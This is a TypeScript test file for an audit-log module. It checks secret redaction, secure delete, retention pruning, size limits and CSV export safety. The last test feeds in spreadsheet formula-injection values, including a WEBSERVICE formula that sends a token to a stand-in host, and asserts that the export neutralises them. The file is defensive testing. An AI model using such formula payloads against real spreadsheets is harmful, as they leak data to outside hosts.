import Database from "better-sqlite3";
import { describe, expect, it } from "vitest";
import { AuditLog } from "../src/audit/AuditLog.js";
import type { ToolCallRequest, VirtualKey } from "../src/auth/KeyManager.js";

const RAW_BEARER = "Bearer persistence-secret-token";
const RAW_API_KEY = "persistence-api-key";
const RAW_PASSWORD = "persistence-password";
const RAW_EMAIL = "audit@example.com";

function key(id = "key-1"): VirtualKey {
  return {
    id,
    name: id,
    tags: [],
    createdAt: new Date("2026-07-20T12:00:00.000Z"),
    isRevoked: false,
  };
}

function request(overrides: Partial<ToolCallRequest> = {}): ToolCallRequest {
  return {
    tool: "github__search_code",
    headers: {
      Authorization: RAW_BEARER,
      "X-API-KEY": RAW_API_KEY,
      "user-agent": `audit-test ${RAW_EMAIL}`,
    },
    input: {
      password: RAW_PASSWORD,
      nested: { refreshToken: RAW_API_KEY },
    },
    ...overrides,
  };
}

function expectNoFixtureSecrets(value: unknown): void {
  const serialized = typeof value === "string" ? value : JSON.stringify(value);
  for (const secret of [RAW_BEARER, RAW_API_KEY, RAW_PASSWORD, RAW_EMAIL]) {
    expect(serialized).not.toContain(secret);
  }
}

function createLegacyAuditTable(db: Database.Database): void {
  db.exec(`
    CREATE TABLE audit_log (
      id TEXT PRIMARY KEY,
      key_id TEXT NOT NULL,
      tool_name TEXT NOT NULL,
      decision TEXT NOT NULL,
      is_error INTEGER NOT NULL DEFAULT 0,
      error TEXT,
      duration_ms INTEGER,
      request_json TEXT NOT NULL,
      created_at TEXT NOT NULL
    )
  `);
}

describe("AuditLog persistence security", () => {
  it("enables SQLite secure delete before retention and remediation", () => {
    const db = new Database(":memory:");
    db.pragma("secure_delete = OFF");

    new AuditLog(db);

    expect(db.pragma("secure_delete", { simple: true })).toBe(1);
  });

  it("uses cryptographically strong unique identifiers for audit rows", () => {
    const db = new Database(":memory:");
    const fixedNow = new Date("2026-07-20T12:00:00.000Z");
    const auditLog = new AuditLog(db, { now: () => fixedNow });

    auditLog.record({ key: key(), request: request(), decision: "allow" });
    auditLog.record({ key: key(), request: request(), decision: "allow" });

    const ids = db.prepare("SELECT id FROM audit_log ORDER BY id").all() as Array<{ id: string }>;
    expect(ids).toHaveLength(2);
    expect(new Set(ids.map(({ id }) => id)).size).toBe(2);
    for (const { id } of ids) {
      expect(id).toMatch(
        /^key-1_1784548800000_[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/
      );
    }
  });

  it("redacts request and error data before SQLite persistence and exports", () => {
    const db = new Database(":memory:");
    const auditLog = new AuditLog(db);

    auditLog.record({
      key: key(),
      request: request(),
      decision: "allow",
      isError: true,
      error: `upstream exposed Authorization: ${RAW_BEARER}; email=${RAW_EMAIL}`,
      durationMs: 42,
      createdAt: new Date("2026-07-20T12:00:00.000Z"),
    });

    const row = db
      .prepare("SELECT request_json, error, redaction_version FROM audit_log")
      .get() as { request_json: string; error: string; redaction_version: number };

    expect(row.redaction_version).toBe(1);
    expect(JSON.parse(row.request_json)).toMatchObject({
      headers: {
        Authorization: "[REDACTED]",
        "X-API-KEY": "[REDACTED]",
        "user-agent": "audit-test ***@***.***",
      },
      input: {
        password: "[REDACTED]",
        nested: { refreshToken: "[REDACTED]" },
      },
    });
    expect(row.error).toContain("[REDACTED]");
    expectNoFixtureSecrets(row);
    expectNoFixtureSecrets(auditLog.query());
    expectNoFixtureSecrets(auditLog.export("json"));
    expectNoFixtureSecrets(auditLog.export("csv"));
  });

  it("adds the redaction version column and remediates legacy and malformed rows in place", () => {
    const db = new Database(":memory:");
    createLegacyAuditTable(db);
    const insert = db.prepare(`
      INSERT INTO audit_log (
        id, key_id, tool_name, decision, is_error, error, duration_ms, request_json, created_at
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);
    insert.run(
      "legacy-valid",
      "key-1",
      "github__search_code",
      "allow",
      1,
      `legacy error token=${RAW_API_KEY}`,
      10,
      JSON.stringify(request()),
      "2026-07-20T12:00:00.000Z"
    );
    insert.run(
      "legacy-malformed",
      "key-2",
      "legacy_tool",
      "deny",
      1,
      `Authorization: ${RAW_BEARER}`,
      null,
      `{"password":"${RAW_PASSWORD}"`,
      "2026-07-20T12:00:01.000Z"
    );

    const auditLog = new AuditLog(db, {
      now: () => new Date("2026-07-20T12:05:00.000Z"),
    });
    const rows = db
      .prepare("SELECT id, request_json, error, redaction_version FROM audit_log ORDER BY id ASC")
      .all() as Array<{
      id: string;
      request_json: string;
      error: string;
      redaction_version: number;
    }>;

    expect(rows).toHaveLength(2);
    expect(rows.every((row) => row.redaction_version === 1)).toBe(true);
    const rowsById = Object.fromEntries(rows.map((row) => [row.id, row]));
    expect(JSON.parse(rowsById["legacy-valid"]!.request_json)).toMatchObject({
      headers: { Authorization: "[REDACTED]" },
    });
    expect(JSON.parse(rowsById["legacy-malformed"]!.request_json)).toMatchObject({
      input: { _audit: "[REMEDIATED_INVALID_JSON]" },
    });
    expectNoFixtureSecrets(rows);
    expectNoFixtureSecrets(auditLog.export("json"));
  });

  it("prunes rows older than the configured retention window", () => {
    const db = new Database(":memory:");
    const now = new Date("2026-07-20T12:00:00.000Z");
    const auditLog = new AuditLog(db, { retentionDays: 30, now: () => now });
    const insert = db.prepare(`
      INSERT INTO audit_log (
        id, key_id, tool_name, decision, is_error, error, duration_ms,
        request_json, created_at, redaction_version
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    for (const [id, createdAt] of [
      ["expired", "2026-06-19T11:59:59.000Z"],
      ["retained", "2026-06-21T12:00:00.000Z"],
    ] as const) {
      insert.run(
        id,
        id,
        "test",
        "allow",
        0,
        null,
        null,
        JSON.stringify({ tool: "test", headers: {}, input: {} }),
        createdAt,
        1
      );
    }

    expect(auditLog.pruneExpired()).toBe(1);
    expect(auditLog.query()).toEqual([
      expect.objectContaining({ key: expect.objectContaining({ id: "retained" }) }),
    ]);
  });

  it("stores bounded valid JSON after redaction and emits injection-safe CSV", () => {
    const db = new Database(":memory:");
    const auditLog = new AuditLog(db, {
      maxRequestBytes: 512,
      maxErrorBytes: 128,
      now: () => new Date("2026-07-20T12:00:00.000Z"),
    });

    auditLog.record({
      key: key("=FORMULA-KEY"),
      request: request({
        tool: '=HYPERLINK("https://example.invalid")',
        input: {
          password: RAW_PASSWORD,
          oversized: `${RAW_API_KEY} ${"payload ".repeat(1000)}`,
        },
      }),
      decision: "deny",
      isError: true,
      error: `=WEBSERVICE("https://example.invalid/?token=${RAW_API_KEY}") ${"x".repeat(500)}`,
    });

    const row = db.prepare("SELECT request_json, error FROM audit_log").get() as {
      request_json: string;
      error: string;
    };
    expect(Buffer.byteLength(row.request_json, "utf8")).toBeLessThanOrEqual(512);
    expect(Buffer.byteLength(row.error, "utf8")).toBeLessThanOrEqual(128);
    expect(() => JSON.parse(row.request_json)).not.toThrow();
    expect(JSON.parse(row.request_json)).toMatchObject({
      input: { _audit: expect.stringContaining("TRUNCATED") },
    });
    expectNoFixtureSecrets(row);

    const csv = auditLog.export("csv");
    expect(csv).toContain("'=FORMULA-KEY");
    expect(csv).toContain("'=HYPERLINK");
    expect(csv).toContain("'=WEBSERVICE");
    expectNoFixtureSecrets(csv);
  });
});
